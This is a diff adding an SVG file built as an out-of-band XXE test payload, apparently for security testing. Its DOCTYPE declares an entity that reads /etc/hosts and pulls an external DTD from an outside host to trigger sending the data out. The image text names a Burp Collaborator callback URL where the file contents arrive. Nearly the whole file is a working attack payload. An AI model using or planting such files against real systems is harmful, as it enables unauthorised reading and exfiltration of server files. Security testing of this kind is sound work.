@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+    <!ENTITY % file SYSTEM "file:///etc/hosts">
+    <!ENTITY % dtd SYSTEM "http://w2.purple-ws.com/xxe-oob.dtd">
+    %dtd;
+    %send;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" 
+     version="1.1" 
+     width="700" 
+     height="500">
+    
+    <rect width="700" height="500" fill="#fff8dc"/>
+    
+    <text x="10" y="30" font-size="16" font-weight="bold" fill="#c00">
+        OOB XXE Test - External SVG
+    </text>
+    
+    <text x="10" y="60" font-size="12" fill="#666">
+        Check server logs for callback
+    </text>
+    
+    <text x="10" y="100" font-size="14" font-family="monospace" fill="#333">
+        If vulnerable, /etc/hosts content sent to:
+    </text>
+    
+    <text x="10" y="125" font-size="11" font-family="monospace" fill="#666">
+        http://dctncfvi5re07ap1xnjkjgjah1nsbj67v.burp.17.rs/xxe-callback?data=[content]
+    </text>
+</svg>
